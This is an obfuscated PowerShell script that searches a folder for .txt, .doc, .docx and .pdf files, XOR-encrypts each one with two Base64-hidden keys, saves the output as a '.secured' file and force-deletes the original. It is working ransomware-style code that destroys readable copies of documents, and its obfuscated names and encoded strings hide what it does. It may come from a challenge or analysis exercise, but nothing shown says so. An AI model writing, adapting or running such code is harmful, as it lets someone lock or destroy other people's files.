$k34Vm = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
$a53Va = "V2R1WE9oeXk1RHo2bW0zV0VBc1pJdDlKTjh3eXluRTlVM1hmRTZJbFVYb2M2THdPbWY1U1JySjNHZlk2dE1Jcw=="
$b64Vb = "VlpwaXpxd3VRbElBSWY4WXBhNzRXNThs"

function a12Vc {
    param([string]$a34Vd)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}

$c56Ve = a12Vc $a53Va
$d78Vf = a12Vc $b64Vb

function l34Vn {
    param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
    $p12Vr = [byte[]]::new($m56Vo.Length)
    for ($x = 0; $x -lt $m56Vo.Length; $x++) {
        $q34Vs = $n78Vp[$x % $n78Vp.Length]
        $r56Vt = $o90Vq[$x % $o90Vq.Length]
        $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
    }
    return $p12Vr
}

function s78Vu {
    param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)
    $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
    $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
    $a34Vc = l34Vn $t90Vv $y90Va $z12Vb
    return [Convert]::ToBase64String($a34Vc)
}

foreach ($ext in (a12Vc $k34Vm).Split(" ")) {
    Get-ChildItem -Path "dca01aq2/" -Recurse | Where-Object { $_.Extension -match "^\.$ext$" } |
        ForEach-Object {
            $s90Vu = [IO.File]::ReadAllBytes($_.FullName)
            $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
            [IO.File]::WriteAllText("$($_.FullName).secured", $t12Vv)
            Remove-Item $_.FullName -Force
        }
}
